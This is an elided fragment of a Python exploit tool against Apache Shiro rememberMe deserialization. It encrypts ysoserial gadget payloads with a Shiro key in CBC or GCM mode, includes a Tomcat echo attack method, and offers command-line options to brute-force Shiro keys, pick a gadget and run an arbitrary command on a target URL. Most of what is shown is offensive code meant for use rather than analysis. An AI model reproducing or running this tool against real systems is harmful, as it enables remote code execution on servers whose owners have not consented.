...
class Payload:
    ...
    def cbc_encrypt(self, file_body=None):
        ...
        base64_ciphertext = base64.b64encode(
            iv + encryptor.encrypt(paded_file_body))
        return base64_ciphertext
...
class Exploit(Command):
    ...
    def tomcat_echo(self, url):
        ...
        if gadget in tomcatEchoPayload:
            ...
            if type == "GCM":
                payload = Payload(self.key).gcm_encrypt(
                    base64.b64decode(tomcatEchoPayload[gadget])).decode()
            else:
                payload = Payload(self.key).cbc_encrypt(
                    base64.b64decode(tomcatEchoPayload[gadget])).decode()
...
if __name__ == '__main__':
    ...
    parser.add_argument('--mode', '-m', type=str,
                        required=True, help='check/crack/yso/echo/encode')
    parser.add_argument('--url', '-u', type=str, metavar='', required=True,
                        help='Target URL address or the file containing the target URL')
    parser.add_argument('--type', '-t', type=str, metavar='default:CBC',
                        default="CBC", help='Cipher Type, GCM or CBC')
    parser.add_argument('--data', '-d', type=str, metavar='', default=None,
                        help='Using this parameter will make HTTP request with POST method')
    parser.add_argument('--key', '-k', type=str, metavar='', default=None,
                        help='Specify a Shiro Key or will use dictionary brute force cracking')
    parser.add_argument('--gadget', '-g', type=str, metavar='',
                        default=None, help='Specific Ysoserial Gadget')
    parser.add_argument('--command', '-c', type=str, metavar='default:whoami',
                        default='whoami', help='Specific Execute Command')
    parser.add_argument('--proxies', '-p', type=str,
